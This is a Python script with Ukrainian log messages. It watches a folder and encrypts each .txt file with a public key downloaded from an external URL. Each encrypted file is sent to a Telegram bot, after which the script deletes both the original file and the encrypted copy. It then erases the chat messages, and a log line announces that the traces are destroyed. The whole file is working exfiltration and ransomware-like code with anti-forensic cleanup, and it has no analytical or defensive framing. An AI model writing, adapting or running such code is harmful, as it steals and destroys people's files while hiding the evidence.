import os
import asyncio
import requests
from telethon import TelegramClient
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet
from dotenv import load_dotenv, find_dotenv

load_dotenv(find_dotenv())
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_USERNAME = os.getenv("BOT_USERNAME")
TARGET_FOLDER = os.getenv("TARGET_FOLDER")
PUBLIC_KEY_URL = os.getenv("PUBLIC_KEY_URL")

client = TelegramClient('user_session', API_ID, API_HASH)

def get_public_key():
    print("[*] завантажую публічний ключ з 3-го джерела...")
    response = requests.get(PUBLIC_KEY_URL)
    return serialization.load_pem_public_key(response.content)

def hybrid_encrypt_file(filepath, public_key):
    fernet_key = Fernet.generate_key()
    f = Fernet(fernet_key)
    with open(filepath, "rb") as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    encrypted_fernet_key = public_key.encrypt(
        fernet_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    
    enc_filepath = filepath + ".enc"
    with open(enc_filepath, "wb") as file:
        file.write(encrypted_fernet_key + encrypted_data)
        
    return enc_filepath

async def main():
    await client.start()
    print("[+] клієнт запущено. Моніторинг папки...")
    
    try:
        public_key = get_public_key()
        print("[+] публічний ключ успішно завантажено!")
    except Exception as e:
        print(f"[-] помилка завантаження ключа: {e}")
        return

    while True:
        for filename in os.listdir(TARGET_FOLDER):
            if filename.endswith(".txt"):
                filepath = os.path.join(TARGET_FOLDER, filename)
                print(f"[*] знайдено файл: {filename}")
                enc_filepath = hybrid_encrypt_file(filepath, public_key)
                message = await client.send_file(BOT_USERNAME, enc_filepath)
                print("[*] файл відправлено на сервер.")
                os.remove(filepath)
                os.remove(enc_filepath)
                await asyncio.sleep(2) 
                async for bot_reply in client.iter_messages(BOT_USERNAME, limit=1):
                    print(f"[*] відповідь сервера: {bot_reply.text}")
                    await client.delete_messages(BOT_USERNAME, [message.id, bot_reply.id])
                    print("[+] сліди в чаті знищено!")
        await asyncio.sleep(5)


with client:
    client.loop.run_until_complete(main())